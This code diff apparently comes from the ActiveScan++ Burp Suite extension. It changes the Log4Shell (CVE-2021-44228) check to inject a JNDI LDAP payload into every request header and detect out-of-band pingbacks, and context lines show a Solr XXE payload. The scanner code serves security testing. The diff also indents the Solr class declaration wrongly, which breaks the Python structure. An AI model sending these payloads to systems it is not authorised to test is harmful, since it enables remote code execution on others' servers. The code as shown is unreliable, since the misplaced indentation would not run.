@@ -717,14 +717,20 @@ class doStruts_2017_12611_scan(IScannerCheck):
 class Log4j(IScannerCheck):
     def doActiveScan(self, basePair, insertionPoint):
         collab = callbacks.createBurpCollaboratorClientContext()
-        attack = request(basePair, insertionPoint, "${jndi:ldap://"+collab.generatePayload(True)+"/a}")
-        interactions = collab.fetchAllCollaboratorInteractions()
-        if interactions:
-            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
-                                    'Log4Shell (CVE-2021-44228)',
-                                    "The application appears to be running a version of log4j vulnerable to RCE. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>" +
-                                    "To investigate, use the manual collaborator client. It may be possible to escalate this vulnerability into RCE. Please refer to https://www.lunasec.io/docs/blog/log4j-zero-day/ for further information",
-                                    'Firm', 'High')]
+        result = []
+        for header in self._get_headers(basePair):
+            offset = helpers.indexOf(basePair.getRequest(), header, False, 0, helpers.analyzeRequest(basePair.getRequest()).getBodyOffset())
+            insertionPoint = helpers.makeScannerInsertionPoint(header, basePair.getRequest(), offset, offset + len(header) + 1)
+
+            attack = request(basePair, insertionPoint, header + ": ${jndi:ldap://"+collab.generatePayload(True)+"/a}")
+            interactions = collab.fetchAllCollaboratorInteractions()
+            if interactions:
+                result.append(CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
+                                        'Log4Shell (CVE-2021-44228)',
+                                        "The application appears to be running a version of log4j vulnerable to RCE. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>" +
+                                        "To investigate, use the manual collaborator client. It may be possible to escalate this vulnerability into RCE. Please refer to https://www.lunasec.io/docs/blog/log4j-zero-day/ for further information",
+                                        'Firm', 'High'))
+        return result
 
     def doPassiveScan(self, basePair):
         return []
@@ -732,8 +738,14 @@ class Log4j(IScannerCheck):
     def consolidateDuplicateIssues(self, existingIssue, newIssue):
         return is_same_issue(existingIssue, newIssue)
 
+    def _get_headers(self, basePair):
+        request = basePair.getRequest()
+        requestInfo = helpers.analyzeRequest(request)
+        headers = requestInfo.getHeaders()
+        return [header.split(':')[0] for header in headers if len(header.split(':')) > 1]
 
-class Solr(IScannerCheck):
+
+    class Solr(IScannerCheck):
     def doActiveScan(self, basePair, insertionPoint):
         collab = callbacks.createBurpCollaboratorClientContext()
         obfuscated_payload = "{!xmlparser v='<!DOCTYPE a SYSTEM \"http://"+collab.generatePayload(True)+"/xxe\"><a></a>'}"
